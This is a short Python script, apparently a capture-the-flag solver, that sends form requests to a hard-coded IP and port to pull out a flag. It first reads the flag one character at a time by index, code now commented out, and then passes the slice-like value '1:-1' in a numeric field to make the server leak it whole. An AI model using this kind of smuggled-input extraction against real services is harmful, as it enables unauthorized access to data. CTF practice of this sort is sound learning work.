import requests

addr = "http://172.105.120.180:9999/"

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

data = "type=FL4G&number="
flag = ""

# for i in range(0,20):
#     res = requests.post(addr, headers=headers, data=data+str(i))
#     print(f"fetching... {chr(res.content[-7])}")
    # flag += chr(res.content[-7])

i = 6
res = requests.post(addr, headers=headers, data=data+"1:-1")
# print(f"fetching... {chr(res.content[-10:])}")
print(res.text)

print("---- FL4G ----")
print(flag)
